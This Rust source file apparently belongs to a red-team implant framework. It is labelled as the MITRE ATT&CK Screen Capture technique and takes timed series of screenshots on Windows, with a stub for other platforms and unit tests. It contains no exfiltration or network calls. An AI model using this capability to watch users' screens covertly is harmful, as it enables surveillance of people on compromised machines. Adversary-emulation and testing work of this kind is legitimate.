//! Screenshot streaming — continuous capture
//!
//! ## MITRE ATT&CK
//! - T1113: Screen Capture

use common::KrakenError;
#[cfg(windows)]
use std::time::{Duration, Instant};

/// Configuration for a streaming capture session
pub struct StreamConfig {
    /// Milliseconds between frames
    pub interval_ms: u32,
    /// JPEG quality hint (0–100); ignored by the BMP encoder but reserved
    pub quality: u32,
    /// Maximum number of frames to capture
    pub max_frames: u32,
}

impl Default for StreamConfig {
    fn default() -> Self {
        Self {
            interval_ms: 1000,
            quality: 50,
            max_frames: 10,
        }
    }
}

/// A single captured frame with its capture timestamp
pub struct CapturedFrame {
    /// BMP-encoded image data
    pub data: Vec<u8>,
    /// Milliseconds elapsed since the stream started
    pub timestamp_ms: u64,
}

/// Capture multiple screenshots at a regular interval.
///
/// Returns up to `config.max_frames` BMP-encoded frames. Each frame is
/// encoded via the existing [`super::encode`] module, matching the single-
/// shot path used by [`super::ScreenshotModule`].
///
/// The function sleeps between frames to maintain the requested cadence. If a
/// single capture takes longer than `interval_ms` the next frame starts
/// immediately (no drift accumulation).
#[cfg(windows)]
pub fn capture_stream(config: &StreamConfig) -> Result<Vec<CapturedFrame>, KrakenError> {
    use super::capture;
    use super::encode;

    let interval = Duration::from_millis(config.interval_ms as u64);
    let mut frames = Vec::with_capacity(config.max_frames as usize);
    let stream_start = Instant::now();

    for _ in 0..config.max_frames {
        let frame_start = Instant::now();

        let raw = capture::capture(0)?;
        let bmp = encode::encode_bmp(&raw)
            .map_err(|e| KrakenError::Module(format!("encode_bmp: {}", e)))?;

        frames.push(CapturedFrame {
            data: bmp,
            timestamp_ms: stream_start.elapsed().as_millis() as u64,
        });

        let elapsed = frame_start.elapsed();
        if elapsed < interval {
            std::thread::sleep(interval - elapsed);
        }
    }

    Ok(frames)
}

/// Non-Windows stub — streaming is not supported on this platform.
#[cfg(not(windows))]
pub fn capture_stream(_config: &StreamConfig) -> Result<Vec<CapturedFrame>, KrakenError> {
    Err(KrakenError::Module(
        "Screenshot streaming only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stream_config_defaults() {
        let cfg = StreamConfig::default();
        assert_eq!(cfg.interval_ms, 1000);
        assert_eq!(cfg.quality, 50);
        assert_eq!(cfg.max_frames, 10);
    }

    #[test]
    #[cfg(not(windows))]
    fn test_capture_stream_unsupported() {
        let cfg = StreamConfig::default();
        assert!(capture_stream(&cfg).is_err());
    }
}
